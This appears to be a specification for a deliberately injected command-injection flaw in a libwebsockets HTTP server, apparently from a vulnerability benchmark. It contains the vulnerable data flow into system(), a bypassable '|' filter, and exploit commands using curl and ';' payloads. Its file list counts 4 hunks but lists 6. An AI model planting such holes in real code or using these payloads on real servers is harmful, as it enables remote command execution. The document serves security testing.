DESCRIPTION:
  CLI-flag-gated command injection in a libwebsockets HTTP server. The server
  must be started with --exec-mode for the vulnerable /exec endpoint to be
  reachable. A user-supplied URL query parameter (cmd=) flows through a
  dispatch struct into system() with only pipe-character filtering (bypassable
  with semicolons or other shell metacharacters).

CONFIG_GATE (C2 — two flags + struct):
  mechanism:  Two CLI flags (--exec-mode, --log-cmds) stored in a global
              struct exec_config { int exec_enabled; int log_cmds; }.
  check:      `if (ecfg.exec_enabled && strncmp(in, "/exec", 5) == 0 ...)`
              in callback_http() — two struct members guard the dispatch path.
  complexity: two conditions, one struct, no file parsing

INPUT_FLOW (I3 — struct dispatch then system()):
  entry:      HTTP GET /exec?cmd=<payload>  →  lws_get_urlarg_by_name_safe()
  path:       handle_exec() extracts "cmd" URL arg into char cmd[256]
              builds `struct dispatch_req { const char *cmd; int log; }`
              calls dispatch_exec(&req) which calls system(req->cmd)
  transforms: URL arg decode by lws, then direct struct field pass

SANITIZATION (S2 — block '|', bypass ';'):
  cmd_safe() rejects any command containing the '|' character.
  Bypass: use ';' to chain commands — e.g. cmd=id;id>/tmp/marker

SINK:        system() inside dispatch_exec() in server.c

CHANGED FILES:
  server.c — 4 hunks:
    1. struct exec_config + static ecfg global
    2. struct dispatch_req + dispatch_exec() function
    3. cmd_safe() sanitization function
    4. handle_exec(): URL arg extraction, S2 check, struct dispatch
    5. callback_http(): C2 gate guard using ecfg.exec_enabled
    6. main(): --exec-mode and --log-cmds flag parsing into ecfg

EXPLOIT:
  build:   bash build.sh
  start:   ./lws_server --port 18105 --wwwroot /tmp/www --exec-mode --log-cmds
  trigger: curl 'http://127.0.0.1:18105/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to fall through to the
               file-serving mount and return 404.
  S2 bypass:   use ';' instead of '|' — e.g. cmd=id;cat>/tmp/pwned

NOTES:
  - system() output goes to the server's stderr (inherited fd), not the
    HTTP response body. Use a write-to-file payload to confirm blind execution.
  - lws_get_urlarg_by_name_safe() URL-decodes the argument, so percent-encoded
    payloads work (e.g. %3B decodes to ';').
